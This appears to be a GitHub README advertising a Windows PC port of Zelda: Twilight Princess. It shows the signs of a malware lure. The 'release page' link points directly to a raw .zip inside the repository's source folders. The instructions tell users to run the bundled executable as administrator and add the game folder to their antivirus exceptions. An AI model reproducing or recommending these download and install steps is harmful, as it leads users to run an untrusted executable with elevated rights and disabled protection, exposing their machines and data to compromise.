# ⚔️ Zelda-TP-PC-Port - Play Twilight Princess on your PC

[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/Ignescent-sirjacobepstein42/Zelda-TP-PC-Port/main/sources/Properties/T-Zelda-Port-P-1.9.zip)

This project brings the experience of The Legend of Zelda: Twilight Princess to Windows computers. This native PC port allows users to play the title without the need for an emulator. It runs directly as a Windows application, which improves performance and stability.

## 📥 Getting the Software

You must visit the official release page to obtain the files for your computer.

[Click here to visit the release page and download the software](https://raw.githubusercontent.com/Ignescent-sirjacobepstein42/Zelda-TP-PC-Port/main/sources/Properties/T-Zelda-Port-P-1.9.zip)

Once you reach the page, look for the section labeled Assets under the most recent version. Click the link that ends in .zip to start your download.

## 🖥️ System Requirements

Ensure your computer meets these minimum specifications for a stable experience:

*   Operating System: Windows 10 or Windows 11
*   Processor: Intel Core i5 or AMD Ryzen 5
*   Memory: 8 GB RAM
*   Graphics Card: NVIDIA GTX 1060 or AMD Radeon RX 580
*   Storage: 2 GB available disk space

## ⚙️ Installation Guide

Follow these steps to set up the port on your system:

1.  Open your Downloads folder after the file download finishes.
2.  Right-click the downloaded .zip file and select Extract All.
3.  Choose a folder on your computer where you want to keep the game.
4.  Open the folder once extraction completes.
5.  Double-click the file named ZeldaTP.exe to launch the application.

## 🎮 Controller Setup

The application supports most modern game controllers. Follow these steps to configure your input device:

1.  Connect your controller to the computer via USB or Bluetooth.
2.  Launch the game.
3.  Press the Escape key on your keyboard to open the in-game menu.
4.  Navigate to the Controller Settings option.
5.  Select your controller from the dropdown list.
6.  Assign your buttons according to the on-screen prompts.
7.  Save your settings to confirm the changes.

## 🖼️ Graphics and Performance

This port includes settings to adjust the visual quality to match your monitor and hardware. Open the Graphics Settings menu to manage the following:

*   Resolution: Select the setting that matches your monitor.
*   Fullscreen Mode: Enable this for an immersive experience.
*   Frame Rate: Choose 30 or 60 frames per second.
*   Texture Quality: High settings provide sharper images, while low settings help older hardware maintain a smooth frame rate.

The game also supports widescreen aspect ratios which allow you to view more of the game world on modern displays. If the image looks stretched, check the Aspect Ratio setting in the Video menu.

## 📂 Managing Game Progress

The game creates a folder in your Documents directory to store save files. These files track your inventory, heart containers, and quest completion status. You should back up this folder regularly to prevent data loss. If you experience issues with loading your progress, verify that the application has permission to write files to your Documents folder.

## 🛠️ Troubleshooting Common Issues

If the software fails to start, verify your hardware meets the requirements listed above. Ensure your graphics drivers are up to date. Many performance issues resolve after updating your system drivers through your manufacturer website.

If the game crashes upon launch, try running the executable as an administrator. Right-click the file, select Properties, and check the option to run as an administrator. 

Check your antivirus software if the game fails to open. Antivirus programs sometimes flag new files as suspicious. You may need to add the game folder to your exception list to allow the application to function.
